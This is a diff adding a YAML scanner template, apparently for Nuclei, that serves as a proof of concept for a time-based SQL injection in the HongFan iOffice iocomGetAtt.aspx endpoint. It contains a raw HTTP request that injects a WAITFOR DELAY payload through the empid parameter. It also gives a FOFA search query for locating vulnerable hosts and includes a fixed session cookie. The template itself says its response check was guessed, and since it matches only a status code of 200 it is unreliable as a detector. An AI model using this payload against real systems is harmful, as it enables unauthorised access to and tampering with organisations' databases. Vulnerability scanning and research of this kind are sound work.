@@ -1,0 +1,35 @@
+id: poc-hfmmnsu4oze45x3e
+info:
+  name: 红帆iocomgetatt接口存在SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hfmmnsu4oze45x3e
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hfmmnsu4oze45x3e
+    fofa: body="./config/pc-app-config.js" && title="HFOffice" || app="红帆-ioffice"
+http:
+- raw:
+  - 'GET /ioffice/prg/interface/iocomGetAtt.aspx?NewPdf=1&empid=1;WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+
+    Connection: close
+
+    Cookie: ASP.NET_SessionId=qwgtdu45xljnlbmrqfzg1y45'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
